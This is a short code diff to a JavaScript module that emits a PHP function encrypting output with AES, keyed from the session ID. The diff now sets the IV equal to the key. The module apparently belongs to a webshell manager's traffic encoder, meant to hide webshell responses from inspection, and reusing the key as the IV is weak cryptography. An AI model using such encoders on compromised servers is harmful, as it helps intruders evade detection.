@@ -55,7 +55,9 @@ module.exports = {
    */
   asoutput: () => {
     return `function asenc($out){
-      return @base64_encode(openssl_encrypt(base64_encode($out), "AES-256-CFB", substr(str_pad(session_id(),32,'a'),0,32),OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, substr(str_pad(session_id(),32,'0'),0,32)));
+      $key=substr(str_pad(session_id(),32,'a'),0,32);
+      $iv=$key;
+      return @base64_encode(openssl_encrypt(base64_encode($out), "AES-256-CFB", $key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, $iv));
     }
     `.replace(/\n\s+/g, '');
   },
